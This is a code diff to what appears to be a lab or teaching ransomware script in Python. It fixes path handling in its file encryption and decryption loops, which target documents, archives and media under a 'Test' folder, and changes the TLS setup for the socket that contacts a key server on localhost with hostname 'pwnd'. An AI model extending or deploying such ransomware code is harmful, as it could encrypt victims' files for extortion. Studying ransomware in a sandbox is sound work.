@@ -90,7 +90,7 @@ def encryptFiles(key):
     #exclude = ['.py','.pem', '.exe', '.imin']
     include = ['.pdf','.txt','.docx','.xlsx','.ppm','.tar','.zip','.jpeg','.mp4','.jar','.png','.gif']
     # loop through our filesystem
-    for item in recursiveScan(os.getcwd() + '\Test'): 
+    for item in recursiveScan(os.path.join(os.getcwd(), 'Test')): 
         # generate the path
         filePath = Path(item)
         extension = filePath.suffix.lower()
@@ -109,7 +109,7 @@ def encryptFiles(key):
 '''
 def decryptFiles(key):
     # Loop through the filesystem
-    for item in recursiveScan(os.getcwd() + '\Test'): 
+    for item in recursiveScan(os.path.join(os.getcwd(), 'Test')): 
         # make filepath
         filePath = Path(item)
         extension = filePath.suffix.lower()
@@ -126,11 +126,12 @@ if __name__ == "__main__":
     HOST = 'localhost'
     PORT = 5789
 
-    context = ssl.create_default_context()
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.load_verify_locations(os.path.join("crypto", "cert.pem"))
 
     # set up our socket to connect to the server
     s = socket.create_connection((HOST, PORT))
-    secSock = context.wrap_socket(s, server_hostname=HOST)
+    secSock = context.wrap_socket(s, server_hostname="pwnd")
     print('Connected!')
     print(bytes(MESSAGE, "utf-8"))
     secSock.send(bytes(MESSAGE, "utf-8"))
